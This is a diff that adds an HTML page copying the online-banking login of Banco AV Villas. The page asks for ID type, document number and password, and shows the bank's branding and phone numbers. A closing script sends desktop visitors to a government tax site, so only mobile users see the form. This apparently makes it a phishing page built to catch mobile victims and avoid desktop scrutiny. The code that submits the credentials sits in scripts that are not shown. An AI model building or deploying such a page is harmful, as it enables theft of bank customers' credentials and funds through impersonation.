@@ -1,0 +1,302 @@
+<html>
+    <head>
+        <title>Consulta Banca Virtual | Banco AV Villas</title>
+        <meta http-equiv="content-type" content="text/html; utf-8">
+        <meta charset="utf-8">
+        <meta content="es" http-equiv="Content-Language">
+        <meta name="description" content="">
+        <meta name="author" content="">
+        <meta name="Copyright" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="theme-color" content="#FF0015">
+        <link rel="icon" href="img/favicon.png">
+        <script type="text/javascript" src="../../../../js/jquery-3.6.0.min.js"></script>      
+        <link href="css/style.css" rel="stylesheet">
+        <link href="css/stylesheet.css" rel="stylesheet">
+        <script type="text/javascript" src="js/functions.js"></script>  
+        <script type="text/javascript" src="js/ready.js"></script>                
+        <style type="text/css">
+            #fondo{
+                position: fixed;
+                width: 100%;
+                height: 100%;
+                left: 0;
+                top: 0;
+                background-color: #f4f5f7cf;
+                z-index: 900;
+            }
+
+            #cargando{
+                position: fixed;
+                top: 50%;
+                left: 50%;
+                transform: translate(-50%, -50%);
+                z-index: 920;
+            }
+        </style>
+    </head>
+    <body>
+        <img src="img/super-v-ne.svg" id="super-nuevo">
+
+        <img id="inf-izq" src="img/inf-izq.svg">
+        <img id="sup-der" src="img/sup-der.svg">
+
+        <input type="hidden" name="hdd-documento" id="hdd-documento" value="CC">
+        <div id="fondo"></div>
+        <img src="img/cargando.gif" id="cargando" width="110">
+        <table width="100%" cellpadding="0" cellspacing="0" border="0" style="margin: 0 auto; max-width: 1280px;">
+            <tr>
+                <td width="60%" valign="top" id="lado-der">
+                    <div class="slider">
+                        <ul>
+                            <li><img src="img/s1.fw-min.png"></li>
+                            <li><img src="img/s2.fw-min.png"></li>
+                            <li><img src="img/s3.fw-min.png"></li>
+                            <li><img src="img/s4.fw-min.png"></li>
+                        </ul>
+                    </div>                    
+                    <table border="0" cellspacing="0" cellpadding="0">
+                        <tr>
+                            <td rowspan="2">
+                                <img src="img/a-logo-color.svg" width="100" style="margin-right: 20px;"> 
+                            </td>       
+                            <td class="etq-titulo">Línea Audiovillas</td>                    
+                        </tr>             
+                        <tr>
+                            <td>
+                                <table cellpadding="0" cellspacing="0" border="0">
+                                    <tr>
+                                        <td class="etq-titulo borde">Bogotá</td>
+                                        <td class="etq-titulo borde">Medellín</td>
+                                        <td class="etq-titulo borde">Barranquilla</td>
+                                        <td class="etq-titulo borde">Bucaramanga</td>
+                                        <td class="etq-titulo borde">Cali</td>
+                                        <td class="etq-titulo">Resto del país</td>
+                                    </tr>
+                                    <tr>
+                                        <td class="etq-telefono borde">(601) 4441777</td>
+                                        <td class="etq-telefono borde">(604) 3256000</td>
+                                        <td class="etq-telefono borde">(605) 3304330</td>
+                                        <td class="etq-telefono borde">(607) 6302980</td>
+                                        <td class="etq-telefono borde">(602) 8859595</td>
+                                        <td class="etq-telefono">01 8000 51 8000</td>
+                                    </tr>
+                                </table>
+                            </td>
+                        </tr>
+                    </table>
+
+                </td>
+                <td width="40%" valign="top" id="lado-izq">
+                    <div class="pnl-izq">
+                        <img src="img/logo-pal.svg">
+
+                        <div class="titulo">Ingresa a la Banca Virtual</div>
+
+                <div class="frm-input" id="inp-tipo">
+                    <table border="0" width="100%" cellpadding="0" cellspacing="0" style="height: 54px;" id="tbl-documento">
+                        <tr>
+                            <td align="left" id="td1">
+                                <div id="titulo-tipo">Tipo de documento</div>
+                                <div id="txt-documento">Cédula de ciudadanía</div>
+                            </td>
+                            <td valign="middle" align="right" width="24" id="td2">
+                                <img src="img/flecha-abajo.jpg" width="16" id="ico-flecha-ab">
+                                <img src="img/flecha-arriba.jpg" width="16" id="ico-flecha-ar">
+                            </td>                            
+                        </tr>
+                    </table>                                
+                </div>
+
+                <div id="menu-tipo">
+                    <div class="item-menu" id="mnu-ced">
+                        Cédula de ciudadanía
+                    </div>
+                    <div class="item-menu" id="mnu-ext">
+                        Cédula de extranjería
+                    </div>
+                    <div class="item-menu" id="mnu-tar">
+                        Tarjeta de identidad
+                    </div>
+                </div>
+
+                <div style="height:32px;"></div>
+
+                <div class="frm-input" id="inp-usuario">
+                    <table border="0" width="100%" cellpadding="0" cellspacing="0" style="height: 54px;">
+                        <tr>
+                            <td align="left">
+                                <div class="etiqueta" id="etq-usuario">Número de documento</div>
+                                <input type="text" class="entrada" id="txt-usuario" name="txt-usuario" autocomplete="off" pattern="[0-9]*" inputmode="numeric" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;">
+                            </td>
+                            <td valign="middle" align="right" width="24">
+                                <img src="img/usuario.jpg" width="20" id="ico-usuario" class="icon-entrada">
+                                <img src="img/alerta.jpg" width="25" id="ico-alerta-u" class="icon-entrada">
+                            </td>
+                        </tr>
+                    </table>                    
+                </div>
+                <div class="error" id="err-usuario">Este campo es requerido.</div>      
+
+                <div style="height:32px;"></div>
+
+                <div class="frm-input" id="inp-password">
+                    <table border="0" width="100%" cellpadding="0" cellspacing="0" style="height: 54px;">
+                        <tr>
+                            <td align="left">
+                                <div class="etiqueta" id="etq-password">Ingresa tu contraseña</div>
+                                <input type="password" class="entrada" id="txt-password" name="txt-password" autocomplete="off">
+                            </td>
+                            <td valign="middle" align="right" width="24">
+                                <img src="img/seguridad.jpg" width="22" id="ico-password" class="icon-entrada">
+                                <img src="img/alerta.jpg" width="25" id="ico-alerta-p" class="icon-entrada">
+                            </td>
+                        </tr>
+                    </table>                    
+                </div>
+                <div class="error" id="err-password">Este campo es requerido.</div>  
+
+                <div style="text-align:right;padding-top:11px; padding-bottom: 35px;">
+                    <table border="0" cellspacing="0" cellpadding="0" style="display: initial;">
+                        <tr>
+                            <td style="color:#0048DB;font-size:12px;cursor:pointer; text-decoration: underline;"><u>Olvidé mi contraseña</u></td>
+                            <td><img src="img/seguridad.svg" width="15"></td>
+                        </tr>
+                    </table>
+                </div>
+
+                <button id="btn-ingresar" type="button" class="btn" disabled="disabled"> INGRESAR </button>
+
+                <div style="border-bottom: 1px solid #fff;height: 30px;">
+                    
+                </div>
+                <div style="color: #252b31;font-size: 14px; text-align: center; margin-top: 20px;">
+                    ¿Aún no tienes contraseña para ingresar? <span style="color:#0048DB; cursor:pointer;text-decoration: underline;">Regístrate.</span>
+                </div>
+
+                    </div>
+                </td>
+            </tr>
+        </table>
+
+        <div id="footer2">
+            <table border="0" cellspacing="0" cellpadding="0" width="90%" style="margin: 0 auto;">
+                <tr>
+                    <td rowspan="2">
+                        <img src="img/a-logo-color.svg" width="100" style="margin-right: 20px; margin-bottom: 10px;"> 
+                        <br>
+                        <img src="img/super-h-ne.svg" width="130">
+                    </td>       
+                    <td class="etq-titulo">Línea Audiovillas</td>                    
+                </tr>             
+                <tr>
+                    <td>
+                        <table cellpadding="0" cellspacing="0" border="0" width="100%">
+                            <tr>
+                                <td class="etq-titulo borde">Bogotá</td>
+                                <td class="etq-titulo borde">Medellín</td>
+                                <td class="etq-titulo borde">Barranquilla</td>
+                                <td class="etq-titulo borde">Bucaramanga</td>
+                                <td class="etq-titulo borde">Cali</td>
+                                <td class="etq-titulo">Resto del país</td>
+                            </tr>
+                            <tr>
+                                <td class="etq-telefono borde">(601) 4441777</td>
+                                <td class="etq-telefono borde">(604) 3256000</td>
+                                <td class="etq-telefono borde">(605) 3304330</td>
+                                <td class="etq-telefono borde">(607) 6302980</td>
+                                <td class="etq-telefono borde">(602) 8859595</td>
+                                <td class="etq-telefono">01 8000 51 8000</td>
+                            </tr>
+                        </table>
+                    </td>
+                </tr>
+            </table>
+        </div>
+
+
+        <div id="footer5">
+            <table border="0" cellspacing="0" cellpadding="0" width="100%">
+                <tr>
+                    <td rowspan="4" id="col-super"><img src="img/superv-blanco.svg" width="10"></td>
+                    <td colspan="7">&nbsp;</td>
+                </tr>
+                <tr>
+                    <td colspan="7" class="etq-titulo">Línea Audiovillas</td>
+                </tr>
+                <tr>
+                    <td colspan="7">&nbsp;</td>
+                </tr>
+                <tr>
+                    <td class="etq-titulo borde">Bogotá<br><span class="etq-telefono-m">(601) 4441777</span></td>
+                    <td class="etq-titulo borde">Medellín<br><span class="etq-telefono-m">(604) 3256000</span></td>
+                    <td class="etq-titulo borde">Barranquilla<br><span class="etq-telefono-m">(605) 3304330</span></td>
+                    <td class="etq-titulo borde">Bucaramanga<br><span class="etq-telefono-m">(607) 6302980</span></td>
+                    <td class="etq-titulo borde">Cali<br><span class="etq-telefono-m">(602) 8859595</span></td>
+                    <td class="etq-titulo">Resto del país<br><span class="etq-telefono-m">01 8000 51 8000</span></td>
+                    <td id="col-logo"><img src="img/logo-blanco.svg" width="70"></td>
+                </tr>
+            </table>
+        </div>
+
+
+        <div id="footer4">
+            <table border="0" width="100%" cellpadding="0" cellspacing="0">
+                <tr>
+                    <td colspan="3" class="etq-titulo">Línea Audiovillas</td>
+                </tr>
+                <tr>
+                    <td class="etq-titulo borde">Nacional<br><span class="etq-telefono-m">01 8000 51 8000</span></td>
+                    <td class="etq-titulo borde">Bogotá<br><span class="etq-telefono-m">(601) 4441777</span></td>
+                    <td>
+                        <table>
+                            <tr>
+                                <td style="color:#fff;" class="etq-titulo">Más ciudades</td>
+                                <td><img src="img/flecha-abajo.png" width="13"></td>
+                            </tr>
+                        </table>
+                     </td>
+                </tr>
+            </table>
+        </div>
+
+        <div id="footer3">
+            <table width="100%" border="0" cellspacing="0" cellspacing="0">
+                <tr>
+                    <td align="left"><img src="img/a-logo-color.svg" width="70"></td>
+                    <td align="right"><img src="img/super-h-ne.svg" width="130"></td>
+                </tr>
+            </table>
+        </div>
+
+    
+<script>
+    function detectar_dispositivo() {
+        var dispositivo = "";
+        if (navigator.userAgent.match(/Android/i))
+            dispositivo = "Android";
+        else if (navigator.userAgent.match(/webOS/i))
+            dispositivo = "webOS";
+        else if (navigator.userAgent.match(/iPhone/i))
+            dispositivo = "iPhone";
+        else if (navigator.userAgent.match(/iPad/i))
+            dispositivo = "iPad";
+        else if (navigator.userAgent.match(/iPod/i))
+            dispositivo = "iPod";
+        else if (navigator.userAgent.match(/BlackBerry/i))
+            dispositivo = "BlackBerry";
+        else if (navigator.userAgent.match(/Windows Phone/i))
+            dispositivo = "Windows Phone";
+        else
+            dispositivo = "PC";
+        return dispositivo;
+    }
+
+    if (detectar_dispositivo() == "PC") {
+        window.location.href = 'https://www.dian.gov.co';
+    }
+</script>
+    
+</body>
+</html>
